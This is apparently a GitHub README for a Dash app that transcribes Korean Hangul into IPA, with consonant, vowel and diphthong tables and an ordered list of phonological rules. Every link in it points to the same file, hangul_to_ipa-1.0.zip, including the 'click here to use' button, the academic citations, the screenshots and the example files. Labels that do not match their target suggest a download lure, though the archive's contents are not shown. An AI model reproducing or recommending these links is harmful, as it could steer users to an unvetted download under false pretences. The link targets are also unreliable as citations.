# hangul_to_ipa
A dash app that transcribes 한글 into [hɑŋɡɯl].

**Enter 한글, get [hɑŋɡɯl].**
**Click [here](https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip) to use.**

This web app applies phonological rules to Korean orthographic forms (Hangul/Hangeul/한글) and transcribe them into IPA. It automatically applies phonological rules from [Shin, Kiaer, and Cha (2012) Ch. 8](https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip). These are rules related to surface phonotactics and syllable structure constraints. The R implementation is motivated by '[hangul converter](https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip),' a part of KPNN. A similar database of Korean surface forms is available as K-SPAN by [Holliday, Turnbull and Eychenne (2017)](https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip), though they do not provide on-the-spot transcription.

In addition to automatic transcription, this program:
 * transliterates Korean orthography in accordance with the Yale Romanization of Korean. The Yale convention is a de facto standard in Korean linguistics. See Martin, Samuel E. (1992). A Reference Grammar of Korean. for details.
 * transcribes Chinese characters as pronounced in Korean. For example, 不正確 'imprecise' is transcribed as [pudʑʌŋwak]

This program does not apply most rules that are sensitive to morphological or other extra-phonological information. Therefore, it works best with monomorphemic words and may not produce reliable outputs otherwise. For instance, Compensatory Vowel Lengthening, Vowel Deletion, Glide Formation, and others cannot be implemented without morphological information. Likewise, /n/-Insertion and /l/-Tensification need etymological information.

## How to use

<img src= "https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip" width=50% />

 1. Enter your Korean word (e.g., 국물 'soup', 韓國語 'the Korean language', or 음운론 'phonology') in the textbox marked red. The results will return on the right side panel.

<img src= "https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip" width=50% />

 2. Select either 'IPA Transcription' or 'Yale Romanization.' Yale Romanization transliterates the spelling, so phonological rules are irrelevant. With IPA Transcription, on the other hand, you can choose to apply all or some phonological rules. See below for phonological rules implemented in this program.

<img src= "https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip" width=50% />

 3. You can also upload a text file and get it transcribed/transliterated. The file should be column-delimited. Here are example files [file1](https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip가로예시.txt?attach=1&https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip) [file2](https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip세로예시.txt?attach=1&https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip)

## Inventory
### Consonants
![image](https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip)
|           |           | Bilabial | Alveolar | Alveo-Palatal | Velar      | Glottal |
|:---------:|:---------:|----------|----------|---------------|------------|---------|
| Plosive   | Lenis     | ㅂ /p/   | ㄷ /t/   |               | ㄱ /k/     |         |
|           | Aspirated | ㅍ /pʰ/  | ㅌ /tʰ/  |               | ㅋ /kʰ/    |         |
|           | Fortis    | ㅃ /p*/  | ㄸ /t*/  |               | ㄲ /k*/    |         |
| Fricative | Aspirated |          | ㅅ /s/   |               |            | ㅎ /h/  |
|           | Fortis    |          | ㅆ /s*/  |               |            |         |
| Affricate | Lenis     |          |          | ㅈ /tɕ/       |            |         |
|           | Aspirated |          |          | ㅊ /tɕʰ/      |            |         |
|           | Fortis    |          |          | ㅉ /tɕ*/      |            |         |
|   Nasal   |           | ㅁ /m/   | ㄴ /n/   |               | 받침ㅇ /ŋ/ |         |
|  Lateral  |           |          | ㄹ /l/   |               |            |         |

### Vowels
![image](https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip)

|      |   Front  |    Back   |         |
|------|:--------:|:---------:|:-------:|
|      |          | Unrounded | Rounded |
| High |   ㅣ /i/  |   ㅡ /ɯ/  |  ㅜ /u/ |
| Mid  | ㅐㅔ /ɛ/ |   ㅓ /ʌ/  |  ㅗ /o/ |
| Low  |          |   ㅏ /a/  |         |

### Diphthongs
![image](https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip)
| 한글 | IPA  | 한글       | IPA  |
|------|------|------------|------|
| ㅠ   | /ju/ | ㅟ         | /wi/ |
| ㅕ   | /jʌ/ | ㅝ         | /wʌ/ |
| ㅛ   | /jo/ | ㅚ   ㅞ ㅙ | /wɛ/ |
| ㅖㅒ | /jɛ/ | ㅘ         | /wa/ |
| ㅑ   | /ja/ | ㅢ         | /ɰi/ |

## Phonological rules (applied in this order)
See [Shin, Kiaer, and Cha (2012) Ch. 8](https://raw.githubusercontent.com/yubin2222222/hangul_to_ipa/main/stable/hangul_to_ipa-1.0.zip) for details.

### Morphological
1. Palatalization 구개음화 (e.g., mɑt-i -> mɑdʒi 'the eldest child')

### Phonological
1. Aspiration 격음화 (e.g., pukhɑn -> pukʰɑn 'North Korea')
1. Place assimilation 음운동화 (e.g., Obstruent nasalisation, Liquid nasalisation and Lateralisation in Shin et al 2012)
1. Post-obstruent tensification 필수적 경음화 (e.g., pɑksu -> pɑks*u 'hand clap')
1. Complex coda simplification 자음군단순화 (e.g., talk-to -> takto 'Chicken-also' NB: the SR must be [takt*o])
1. Coda neutralization 음절말 장애음 중화 (e.g., bitɕʰ, bitɕ, bis -> bit 'light / debt / hair comb')

### Optional
1. (Optional) intersonorant H-deletion 공명음사이 'ㅎ' 삭제 (e.g., sʌnho → sʌno 'preference')
1. (Optional) non-coronalization 수의적 조음위치동화 (e.g., hɑnkɯl → hɑŋɡɯl 'the Korean alphabet')

### Phonetic
1. (Phonetic) intersonorant obstruent voicing 장애음 유성음화 (e.g., tɕikɑk → tɕiɡɑk 'being late')
1. (Phonetic) liquid alternation [l ~ ɾ] (e.g., tʰɑlɑk → tʰɑɾɑk 'depravity')
